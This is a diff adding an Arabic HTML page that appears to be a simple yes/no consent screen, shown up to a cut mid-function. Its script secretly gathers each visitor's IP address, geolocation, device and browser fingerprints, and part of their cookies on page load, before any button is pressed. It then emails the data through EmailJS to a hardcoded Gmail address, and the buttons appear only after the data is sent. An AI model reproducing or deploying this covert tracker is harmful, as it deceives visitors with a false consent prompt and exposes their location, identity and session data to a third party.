@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            overflow: hidden;
+        }
+        
+        .consent-screen {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .buttons-container {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+        
+        .consent-btn {
+            padding: 25px 60px;
+            font-size: 22px;
+            font-weight: bold;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            min-width: 180px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        
+        .consent-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.7s;
+        }
+        
+        .consent-btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn-yes {
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            color: white;
+            box-shadow: 0 10px 30px rgba(0, 176, 155, 0.4);
+        }
+        
+        .btn-no {
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            color: white;
+            box-shadow: 0 10px 30px rgba(255, 65, 108, 0.4);
+        }
+        
+        .btn-yes:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 40px rgba(0, 176, 155, 0.6);
+        }
+        
+        .btn-no:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 40px rgba(255, 65, 108, 0.6);
+        }
+        
+        .white-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: none;
+            z-index: 1000;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- شاشة الموافقة - تظهر كلمات فقط -->
+    <div class="consent-screen" id="consentScreen">
+        <div class="buttons-container">
+            <button class="consent-btn btn-yes" id="btnYes">نعم</button>
+            <button class="consent-btn btn-no" id="btnNo">لا</button>
+        </div>
+    </div>
+
+    <!-- شاشة بيضاء تماماً -->
+    <div class="white-screen" id="whiteScreen"></div>
+
+    <script>
+        // ============== إعدادات EmailJS ==============
+        const EMAILJS_CONFIG = {
+            SERVICE_ID: "service_p76jeth",      // Service ID من لوحة تحكم EmailJS
+            TEMPLATE_ID: "template_1fslzcx",    // Template ID من قوالب EmailJS
+            PUBLIC_KEY: "DIvdi_yFjAn7-N-Zm",      // Public Key من EmailJS Dashboard
+            EMAIL_TO: "yynjj38@gmail.com"    // الإيميل المستقبل
+        };
+        
+        // ============== إعدادات النظام ==============
+        const SYSTEM_CONFIG = {
+            AUTO_SEND: true,                         // الإرسال التلقائي عند فتح الصفحة
+            COLLECT_DATA: true,                      // جمع البيانات
+            SEND_ON_PAGE_LOAD: true,                 // الإرسال عند تحميل الصفحة
+            SEND_ON_CLICK: false,                    // لا يرسل عند الضغط
+            STORE_LOCALLY: false,                    // تخزين البيانات محلياً
+            DELAY_BEFORE_SEND: 2000,                 // تأخير 2 ثانية قبل الإرسال
+            MAX_DATA_SIZE: 50000                     // الحد الأقصى لحجم البيانات
+        };
+
+        // ============== جمع البيانات فور تحميل الصفحة ==============
+        document.addEventListener('DOMContentLoaded', async function() {
+            console.log('🚀 بدء جمع البيانات تلقائياً...');
+            
+            // جمع البيانات المتقدمة
+            const collectedData = await collectComprehensiveData();
+            console.log('✅ تم جمع البيانات:', collectedData);
+            
+            // إرسال البيانات تلقائياً بعد تأخير
+            if (SYSTEM_CONFIG.SEND_ON_PAGE_LOAD) {
+                setTimeout(async () => {
+                    if (SYSTEM_CONFIG.AUTO_SEND) {
+                        if (EMAILJS_CONFIG.PUBLIC_KEY !== "YOUR_PUBLIC_KEY_HERE" &&
+                            EMAILJS_CONFIG.SERVICE_ID !== "YOUR_SERVICE_ID_HERE" &&
+                            EMAILJS_CONFIG.TEMPLATE_ID !== "YOUR_TEMPLATE_ID_HERE") {
+                            
+                            const sent = await sendDataViaEmailJS(collectedData);
+                            console.log(sent ? '✅ تم إرسال البيانات بنجاح' : '❌ فشل إرسال البيانات');
+                            
+                            // إظهار الأزرار بعد الإرسال
+                            document.getElementById('consentScreen').style.display = 'block';
+                            
+                        } else {
+                            console.warn('⚠️ يرجى إعداد بيانات EmailJS أولاً');
+                            document.getElementById('consentScreen').style.display = 'block';
+                        }
+                    }
+                }, SYSTEM_CONFIG.DELAY_BEFORE_SEND);
+            }
+        });
+
+        // ============== دالة إرسال البيانات عبر EmailJS ==============
+        async function sendDataViaEmailJS(data) {
+            try {
+                // تحميل مكتبة EmailJS إذا لم تكن محملة
+                if (typeof emailjs === 'undefined') {
+                    await loadEmailJSLibrary();
+                }
+                
+                // تهيئة EmailJS بالمفتاح العام
+                emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+                
+                // تحضير محتوى الإيميل
+                const emailContent = createStructuredEmailContent(data);
+                
+                // معلمات الإرسال
+                const templateParams = {
+                    to_email: EMAILJS_CONFIG.EMAIL_TO,
+                    subject: `📊 زيارة جديدة - ${data.session.id.substring(0, 12)}`,
+                    message: emailContent,
+                    session_id: data.session.id,
+                    timestamp: new Date(data.session.timestamp).toLocaleString('ar-SA'),
+                    ip_address: data.network.ip || 'غير متاح',
+                    location: data.network.geo?.city || 'غير معروف',
+                    country: data.network.geo?.country || 'غير معروف',
+                    full_data_json: JSON.stringify(data, null, 2)
+                };
+                
+                // إرسال الإيميل
+                const response = await emailjs.send(
+                    EMAILJS_CONFIG.SERVICE_ID,
+                    EMAILJS_CONFIG.TEMPLATE_ID,
+                    templateParams
+                );
+                
+                return response.status === 200;
+                
+            } catch (error) {
+                console.error('❌ خطأ في إرسال البيانات:', error);
+                return false;
+            }
+        }
+
+        // ============== دوال مساعدة ==============
+        
+        // تحميل مكتبة EmailJS
+        function loadEmailJSLibrary() {
+            return new Promise((resolve, reject) => {
+                if (typeof emailjs !== 'undefined') {
+                    resolve();
+                    return;
+                }
+                
+                const script = document.createElement('script');
+                script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+                script.onload = () => {
+                    console.log('✅ تم تحميل مكتبة EmailJS');
+                    resolve();
+                };
+                script.onerror = reject;
+                document.head.appendChild(script);
+            });
+        }
+
+        // إنشاء محتوى الإيميل منظم ومرتب
+        function createStructuredEmailContent(data) {
+            return `
+                <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f7fa; border-radius: 10px;">
+                    
+                    <!-- العنوان الرئيسي -->
+                    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 10px 10px 0 0; text-align: center;">
+                        <h1 style="margin: 0; font-size: 28px;">📊 تقرير بيانات زيارة جديدة</h1>
+                        <p style="margin: 10px 0 0 0; opacity: 0.9; font-size: 16px;">تم جمع البيانات تلقائياً عند فتح الموقع</p>
+                    </div>
+                    
+                    <!-- معلومات الجلسة -->
+                    <div style="background: white; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #3498db;">
+                        <h2 style="color: #3498db; margin-top: 0; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px;">📋 معلومات الجلسة</h2>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
+                            <div><strong>🆔 رقم الجلسة:</strong><br><code style="background: #f8f9fa; padding: 5px; border-radius: 4px;">${data.session.id}</code></div>
+                            <div><strong>🕐 وقت الزيارة:</strong><br>${new Date(data.session.timestamp).toLocaleString('ar-SA')}</div>
+                            <div><strong>⏱️ وقت التحميل:</strong><br>${Math.round(data.session.page_load_time)} مللي ثانية</div>
+                            <div><strong>📍 مصدر الزيارة:</strong><br>${data.session.referrer_source === 'direct' ? 'زيارة مباشرة' : 'من موقع آخر'}</div>
+                        </div>
+                    </div>
+                    
+                    <!-- معلومات الشبكة والموقع -->
+                    <div style="background: white; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #2ecc71;">
+                        <h2 style="color: #2ecc71; margin-top: 0; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px;">🌐 معلومات الشبكة والموقع</h2>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
+                            <div><strong>📍 عنوان IP:</strong><br><code style="background: #e8f6f3; padding: 5px; border-radius: 4px;">${data.network.ip || 'غير متاح'}</code></div>
+                            <div><strong>🏙️ المدينة:</strong><br>${data.network.geo?.city || 'غير معروف'}</div>
+                            <div><strong>🌍 الدولة:</strong><br>${data.network.geo?.country || 'غير معروف'}</div>
+                            <div><strong>🗺️ الإحداثيات:</strong><br>${data.network.geo?.latitude || 'N/A'}, ${data.network.geo?.longitude || 'N/A'}</div>
+                            <div><strong>📡 مزود الخدمة:</strong><br>${data.network.geo?.isp || 'غير معروف'}</div>
+                            <div><strong>📶 نوع الشبكة:</strong><br>${data.network.effective_type || 'غير معروف'}</div>
+                            <div><strong>⬇️ سرعة التنزيل:</strong><br>${data.network.downlink || 'غير معروف'} Mbps</div>
+                            <div><strong>📊 وقت الاستجابة:</strong><br>${data.network.rtt || 'غير معروف'} مللي ثانية</div>
+                        </div>
+                    </div>
+                    
+                    <!-- معلومات الجهاز والمتصفح -->
+                    <div style="background: white; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #e74c3c;">
+                        <h2 style="color: #e74c3c; margin-top: 0; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px;">🖥️ معلومات الجهاز والمتصفح</h2>
+                        
+                        <h3 style="color: #c0392b; margin-top: 20px;">🌐 معلومات المتصفح</h3>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-bottom: 20px;">
+                            <div><strong>المتصفح:</strong><br>${data.browser.name} ${data.browser.version}</div>
+                            <div><strong>المحرك:</strong><br>${data.browser.engine}</div>
+                            <div><strong>إصدار كامل:</strong><br><small style="color: #666;">${data.browser.full_version.substring(0, 80)}...</small></div>
+                            <div><strong>اللغة:</strong><br>${data.browser.language}</div>
+                            <div><strong>اللغات المدعومة:</strong><br>${data.browser.languages.join(', ')}</div>
+                            <div><strong>وكيل المستخدم:</strong><br><small style="color: #666;">${data.browser.user_agent.substring(0, 60)}...</small></div>
+                        </div>
+                        
+                        <h3 style="color: #c0392b; margin-top: 20px;">💻 معلومات النظام</h3>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-bottom: 20px;">
+                            <div><strong>نظام التشغيل:</strong><br>${data.os.name} ${data.os.version || ''}</div>
+                            <div><strong>المنصة:</strong><br>${data.os.platform}</div>
+                            <div><strong>البنية:</strong><br>${data.os.architecture || 'غير معروف'}</div>
+                            <div><strong>نوع الجهاز:</strong><br>${data.device.type}</div>
+                        </div>
+                        
+                        <h3 style="color: #c0392b; margin-top: 20px;">📱 معلومات الشاشة</h3>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
+                            <div><strong>الدقة:</strong><br>${data.screen.width} × ${data.screen.height}</div>
+                            <div><strong>الدقة المتاحة:</strong><br>${data.screen.avail_width} × ${data.screen.avail_height}</div>
+                            <div><strong>نسبة البكسل:</strong><br>${data.screen.pixel_ratio}</div>
+                            <div><strong>عمق الألوان:</strong><br>${data.screen.color_depth} بت</div>
+                            <div><strong>التوجه:</strong><br>${data.screen.orientation_type || 'غير معروف'}</div>
+                            <div><strong>زاوية الدوران:</strong><br>${data.screen.orientation_angle || '0'}°</div>
+                        </div>
+                    </div>
+                    
+                    <!-- معلومات الأجهزة والإمكانيات -->
+                    <div style="background: white; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #f39c12;">
+                        <h2 style="color: #f39c12; margin-top: 0; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px;">⚙️ معلومات الأجهزة والإمكانيات</h2>
+                        
+                        <h3 style="color: #d68910; margin-top: 20px;">🔧 المواصفات الفنية</h3>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-bottom: 20px;">
+                            <div><strong>عدد المعالجات:</strong><br>${data.hardware.concurrency}</div>
+                            <div><strong>ذاكرة الجهاز:</strong><br>${data.hardware.device_memory || 'غير معروف'} GB</div>
+                            <div><strong>نقاط اللمس:</strong><br>${data.hardware.max_touch_points}</div>
+                            <div><strong>دعم الاهتزاز:</strong><br>${data.hardware.vibration ? '✅ نعم' : '❌ لا'}</div>
+                            <div><strong>نوع وحدة المعالجة:</strong><br>${data.hardware.cpu_class || 'غير معروف'}</div>
+                            <div><strong>فئة الجهاز:</strong><br>${data.hardware.device_class || 'غير معروف'}</div>
+                        </div>
+                        
+                        <h3 style="color: #d68910; margin-top: 20px;">🎮 الرسومات</h3>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-bottom: 20px;">
+                            <div><strong>مزود GPU:</strong><br>${data.graphics.gpu_vendor || 'غير معروف'}</div>
+                            <div><strong>عارض GPU:</strong><br>${data.graphics.gpu_renderer || 'غير معروف'}</div>
+                            <div><strong>إصدار WebGL:</strong><br>${data.graphics.webgl_version || 'غير معروف'}</div>
+                            <div><strong>دعم WebGL2:</strong><br>${data.graphics.webgl2 ? '✅ نعم' : '❌ لا'}</div>
+                        </div>
+                    </div>
+                    
+                    <!-- معلومات التخزين والملفات -->
+                    <div style="background: white; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #9b59b6;">
+                        <h2 style="color: #9b59b6; margin-top: 0; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px;">💾 معلومات التخزين والملفات</h2>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
+                            <div><strong>ملفات تعريف الارتباط:</strong><br>${data.storage.cookies_enabled ? '✅ مفعلة' : '❌ معطلة'}</div>
+                            <div><strong>عدد الكوكيز:</strong><br>${data.storage.cookies_count}</div>
+                            <div><strong>التخزين المحلي:</strong><br>${data.storage.local_storage ? '✅ مدعوم' : '❌ غير مدعوم'}</div>
+                            <div><strong>عناصر التخزين:</strong><br>${data.storage.local_storage_items}</div>
+                            <div><strong>جلسة التخزين:</strong><br>${data.storage.session_storage ? '✅ مدعوم' : '❌ غير مدعوم'}</div>
+                            <div><strong>IndexedDB:</strong><br>${data.storage.indexed_db ? '✅ مدعوم' : '❌ غير مدعوم'}</div>
+                            <div><strong>ذاكرة التخزين المؤقت:</strong><br>${data.storage.cache_storage ? '✅ مدعوم' : '❌ غير مدعوم'}</div>
+                        </div>
+                    </div>
+                    
+                    <!-- معلومات الوقت والمنطقة -->
+                    <div style="background: white; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #1abc9c;">
+                        <h2 style="color: #1abc9c; margin-top: 0; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px;">🕒 معلومات الوقت والمنطقة</h2>
+                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
+                            <div><strong>المنطقة الزمنية:</strong><br>${data.time.timezone}</div>
+                            <div><strong>الإعدادات المحلية:</strong><br>${data.time.locale}</div>
+                            <div><strong>نظام التقويم:</strong><br>${data.time.calendar}</div>
+                            <div><strong>تنسيق الوقت:</strong><br>${data.time.hour_cycle}</div>
+                            <div><strong>التوقيت المحلي:</strong><br>${data.time.local_time}</div>
+                            <div><strong>توقيت UTC:</strong><br>${data.time.utc_offset} دقيقة</div>
+                            <div><strong>التاريخ الهجري:</strong><br>${data.time.hijri_date || 'غير متاح'}</div>
+                            <div><strong>التوقيت الصيفي:</strong><br>${data.time.daylight_saving ? '✅ مفعل' : '❌ معطل'}</div>
+                        </div>
+                    </div>
+                    
+                    <!-- معلومات إضافية -->
+                    <div style="background: white; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #34495e;">
+                        <h2 style="color: #34495e; margin-top: 0; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px;">🔍 معلومات إضافية</h2>
+                        
+                        <h3 style="color: #2c3e50; margin-top: 20px;">🔌 الإضافات والبرامج المساعدة</h3>
+                        <div style="margin-bottom: 20px;">
+                            <p><strong>عدد الإضافات:</strong> ${data.plugins.count}</p>
+                            <div style="background: #f8f9fa; padding: 10px; border-radius: 5px; max-height: 150px; overflow-y: auto;">
+                                ${data.plugins.list.map(p => `<div style="padding: 5px 0; border-bottom: 1px solid #eee;">• ${p.name}</div>`).join('')}
+                            </div>
+                        </div>
+                        
+                        <h3 style="color: #2c3e50; margin-top: 20px;">🎛️ أنواع MIME المدعومة</h3>
+                        <div style="background: #f8f9fa; padding: 10px; border-radius: 5px; max-height: 150px; overflow-y: auto;">
+                            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">
+                                ${data.mime_types.list.map(m => `<div style="font-size: 12px; padding: 3px;">• ${m.type}</div>`).join('')}
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- البصمة الرقمية -->
+                    <div style="background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%); color: white; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: center;">
+                        <h3 style="margin-top: 0;">🔐 البصمة الرقمية للجهاز</h3>
+                        <code style="background: rgba(255,255,255,0.1); padding: 10px 15px; border-radius: 5px; display: inline-block; margin: 10px 0; font-size: 14px;">
+                            ${data.fingerprint.full}
+                        </code>
+                        <p style="margin: 10px 0 0 0; opacity: 0.8; font-size: 14px;">
+                            🆔 المعرف الفريد: <strong>${data.fingerprint.short}</strong>
+                        </p>
+                    </div>
+                    
+                    <!-- التذييل -->
+                    <div style="text-align: center; color: #7f8c8d; font-size: 12px; margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd;">
+                        <p>📊 <strong>إجمالي البيانات المجمعة:</strong> ${JSON.stringify(data).length} حرف</p>
+                        <p>⚡ <strong>وقت المعالجة:</strong> ${Math.round(data.session.page_load_time)} مللي ثانية</p>
+                        <p>🛡️ <strong>جمع البيانات:</strong> تلقائي عند فتح الصفحة</p>
+                        <p>⏰ ${new Date().toLocaleString('ar-SA', { dateStyle: 'full', timeStyle: 'medium' })}</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ============== جمع البيانات الشامل ==============
+        async function collectComprehensiveData() {
+            const data = {
+                session: {
+                    id: generateSessionId(),
+                    timestamp: new Date().toISOString(),
+                    page_load_time: performance.now(),
+                    referrer_source: document.referrer ? 'external' : 'direct',
+                    navigation_type: performance.getEntriesByType('navigation')[0]?.type || 'navigate',
+                    redirect_count: performance.navigation?.redirectCount || 0
+                },
+                
+                network: await collectNetworkData(),
+                browser: collectBrowserData(),
+                os: collectOSData(),
+                device: collectDeviceData(),
+                screen: collectScreenData(),
+                hardware: collectHardwareData(),
+                graphics: await collectGraphicsData(),
+                storage: collectStorageData(),
+                time: collectTimeData(),
+                plugins: collectPluginsData(),
+                mime_types: collectMimeTypesData(),
+                apis: collectAPIData(),
+                performance: collectPerformanceData(),
+                battery: await collectBatteryData(),
+                media: await collectMediaData(),
+                fonts: await collectFontsData(),
+                audio: await collectAudioData(),
+                webgl: collectWebGLData(),
+                canvas: collectCanvasData(),
+                fingerprint: await generateFingerprint()
+            };
+            
+            return data;
+        }
+
+        // ============== دوال جمع البيانات التفصيلية ==============
+        
+        function generateSessionId() {
+            const timestamp = Date.now();
+            const random = Math.random().toString(36).substr(2, 12);
+            return `sess_${timestamp}_${random}`;
+        }
+
+        async function collectNetworkData() {
+            const networkInfo = {
+                ip: 'غير متاح',
+                effective_type: 'غير معروف',
+                downlink: 'غير معروف',
+                rtt: 'غير معروف',
+                save_data: false,
+                geo: {}
+            };
+            
+            try {
+                // محاولات متعددة للحصول على IP
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://api.myip.com',
+                    'https://ipapi.co/json/'
+                ];
+                
+                for (const service of ipServices) {
+                    try {
+                        const response = await fetch(service);
+                        const data = await response.json();
+                        networkInfo.ip = data.ip || data.ipAddress;
+                        if (networkInfo.ip) break;
+                    } catch (e) {}
+                }
+                
+                if (networkInfo.ip) {
+                    // معلومات الموقع
+                    try {
+                        const geoResponse = await fetch(`https://ipapi.co/${networkInfo.ip}/json/`);
+                        const geoData = await geoResponse.json();
+                        networkInfo.geo = {
+                            ip: geoData.ip,
+                            city: geoData.city,
+                            region: geoData.region,
+                            country: geoData.country_name,
+                            country_code: geoData.country_code,
+                            continent: geoData.continent_code,
+                            latitude: geoData.latitude,
+                            longitude: geoData.longitude,
+                            timezone: geoData.timezone,
+                            utc_offset: geoData.utc_offset,
+                            org: geoData.org,
+                            asn: geoData.asn,
+                            postal: geoData.postal,
+                            calling_code: geoData.country_calling_code,
+                            currency: geoData.currency,
+                            languages: geoData.languages
+                        };
+                    } catch (e) {}
+                    
+                    // معلومات إضافية
+                    try {
+                        const infoResponse = await fetch(`https://ipinfo.io/${networkInfo.ip}/json`);
+                        const infoData = await infoResponse.json();
+                        networkInfo.geo.hostname = infoData.hostname;
+                        networkInfo.geo.anycast = infoData.anycast;
+                    } catch (e) {}
+                }
+            } catch (e) {
+                console.log('⚠️ لا يمكن الحصول على معلومات الشبكة');
+            }
+            
+            // معلومات اتصال الشبكة
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                networkInfo.effective_type = conn.effectiveType || 'غير معروف';
+                networkInfo.downlink = conn.downlink || 'غير معروف';
+                networkInfo.rtt = conn.rtt || 'غير معروف';
+                networkInfo.save_data = conn.saveData || false;
+                networkInfo.downlink_max = conn.downlinkMax;
+                networkInfo.type = conn.type;
+                networkInfo.onchange = typeof conn.onchange;
+            }
+            
+            return networkInfo;
+        }
+
+        function collectBrowserData() {
+            const ua = navigator.userAgent;
+            
+            // كشف المتصفح
+            let name = 'غير معروف';
+            let version = 'غير معروف';
+            let engine = 'غير معروف';
+            
+            if (ua.includes('Chrome') && !ua.includes('Edg')) {
+                name = 'Chrome';
+                version = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'غير معروف';
+                engine = 'Blink';
+            } else if (ua.includes('Firefox')) {
+                name = 'Firefox';
+                version = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'غير معروف';
+                engine = 'Gecko';
+            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+                name = 'Safari';
+                version = ua.match(/Version\/([\d.]+)/)?.[1] || 'غير معروف';
+                engine = 'WebKit';
+            } else if (ua.includes('Edg')) {
+                name = 'Edge';
+                version = ua.match(/Edg\/([\d.]+)/)?.[1] || 'غير معروف';
+                engine = 'Blink';
+            } else if (ua.includes('Opera') || ua.includes('OPR')) {
+                name = 'Opera';
+                version = ua.match(/(Opera|OPR)\/([\d.]+)/)?.[2] || 'غير معروف';
+                engine = 'Blink';
+            }
+            
+            return {
+                name,
+                version,
+                engine,
+                full_version: ua,
+                user_agent: ua,
+                app_name: navigator.appName,
+                app_version: navigator.appVersion,
+                app_code_name: navigator.appCodeName,
+                product: navigator.product,
+                product_sub: navigator.productSub,
+                vendor: navigator.vendor,
+                vendor_sub: navigator.vendorSub,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookie_enabled: navigator.cookieEnabled,
+                do_not_track: navigator.doNotTrack || navigator.msDoNotTrack,
+                pdf_viewer_enabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                bravia: navigator.bravia || false,
+                build_id: navigator.buildID || 'غير معروف',
+                oscpu: navigator.oscpu || 'غير معروف',
+                security_policy: navigator.securityPolicy || 'غير معروف'
+            };
+        }
+
+        function collectOSData() {
+            const ua = navigator.userAgent;
+            let name = 'غير معروف';
+            let version = 'غير معروف';
+            
+            if (ua.includes('Windows')) {
+                name = 'Windows';
+                if (ua.includes('Windows NT 10.0')) version = '10';
+                else if (ua.includes('Windows NT 6.3')) version = '8.1';
+                else if (ua.includes('Windows NT 6.2')) version = '8';
+                else if (ua.includes('Windows NT 6.1')) version = '7';
+            } else if (ua.includes('Mac OS')) {
+                name = 'macOS';
+                version = ua.match(/Mac OS X ([^)]+)/)?.[1] || 'غير معروف';
+            } else if (ua.includes('Linux')) {
+                name = 'Linux';
+                version = 'غير معروف';
+            } else if (ua.includes('Android')) {
+                name = 'Android';
+                version = ua.match(/Android ([\d.]+)/)?.[1] || 'غير معروف';
+            } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
+                name = 'iOS';
+                version = ua.match(/OS ([\d_]+)/)?.[1].replace(/_/g, '.') || 'غير معروف';
+            }
+            
+            return {
+                name,
+                version,
+                platform: navigator.platform,
+                architecture: navigator.userAgentData?.architecture || 'غير معروف',
+                bitness: navigator.userAgentData?.bitness || 'غير معروف',
+                model: navigator.userAgentData?.model || 'غير معروف',
+                wow64: navigator.userAgentData?.wow64 || false
+            };
+        }
+
+        function collectDeviceData() {
+            const ua = navigator.userAgent;
+            let type = 'كمبيوتر';
+            
+            if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
+                type = /tablet|ipad/i.test(ua) ? 'تابلت' : 'جوال';
+            }
+            
+            return {
+                type,
+                mobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
+                tablet: /tablet|ipad/i.test(ua) && !/mobile|android/i.test(ua),
+                smart_tv: /smart-tv|smarttv|googletv|appletv|hbbtv|pov_tv|netcast|boxee|kylo|roku|dlnadoc|roku|pov_tv|pov_tv/i.test(ua),
+                game_console: /xbox|playstation|wii|nintendo/i.test(ua),
+                bot: /bot|crawler|spider|scraper|checker/i.test(ua)
+            };
+        }
+
+        function collectScreenData() {
+            return {
+                width: screen.width,
+                height: screen.height,
+                avail_width: screen.availWidth,
+                avail_height: screen.availHeight,
+                color_depth: screen.colorDepth,
+                pixel_depth: screen.pixelDepth,
+                pixel_ratio: window.devicePixelRatio,
+                orientation_type: screen.orientation?.type,
+                orientation_angle: screen.orientation?.angle,
+                left: screen.left,
+                top: screen.top,
+                is_extended: screen.isExtended,
+                primary: screen.isPrimary,
+                id: screen.id,
+                touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                max_touch_points: navigator.maxTouchPoints,
+                color_gamut: screen.colorGamut,
+                hdr: screen.hdr,
+                contrast: screen.contrast,
+                reduced_motion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+                color_scheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+            };
+        }
+
+        function collectHardwareData() {
+            return {
+                concurrency: navigator.hardwareConcurrency,
+                device_memory: navigator.deviceMemory || 'غير معروف',
+                max_touch_points: navigator.maxTouchPoints,
+                cpu_class: navigator.cpuClass || 'غير معروف',
+                device_class: navigator.deviceClass || 'غير معروف',
+                vibration: 'vibrate' in navigator,
+                usb: 'usb' in navigator,
+                bluetooth: 'bluetooth' in navigator,
+                serial: 'serial' in navigator,
+                hid: 'HID' in navigator,
+                xr: 'xr' in navigator,
+                gamepad: 'getGamepads' in navigator
+            };
+        }
+
+        async function collectGraphicsData() {
+            const graphics = {
+                gpu_vendor: 'غير معروف',
+                gpu_renderer: 'غير معروف',
+                webgl_version: 'غير معروف',
+                webgl2: false,
+                webgpu: 'gpu' in navigator
+            };
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    graphics.gpu_vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'غير معروف';
+                    graphics.gpu_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'غير معروف';
+                    graphics.webgl_version = gl.getParameter(gl.VERSION);
+                    graphics.webgl2 = 'WebGL2RenderingContext' in window;
+                }
+            } catch (e) {}
+            
+            return graphics;
+        }
+
+        function collectStorageData() {
+            return {
+                cookies_enabled: navigator.cookieEnabled,
+                cookies_count: document.cookie ? document.cookie.split(';').length : 0,
+                cookies_content: document.cookie.substring(0, 200),
+                local_storage: typeof localStorage !== 'undefined',
+                local_storage_items: localStorage ? Object.keys(localStorage).length : 0,
+                session_storage: typeof sessionStorage !== 'undefined',
+                session_storage_items: sessionStorage ? Object.keys(sessionStorage).length : 0,
+                indexed_db: 'indexedDB' in window,
+                cache_storage: 'caches' in window,
+                quota: 'storage' in navigator ? 'مدعوم' : 'غير مدعوم'
+            };
+        }
+
+        function collectTimeData() {
+            const now = new Date();
+            const hijriDate = getHijriDate();
+            
+            return {
+                local_time: now.toLocaleString('ar-SA'),
+                iso_time: now.toISOString(),
+                timestamp: now.getTime(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+                hour_cycle: Intl.DateTimeFormat().resolvedOptions().hourCycle,
+                numbering_system: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
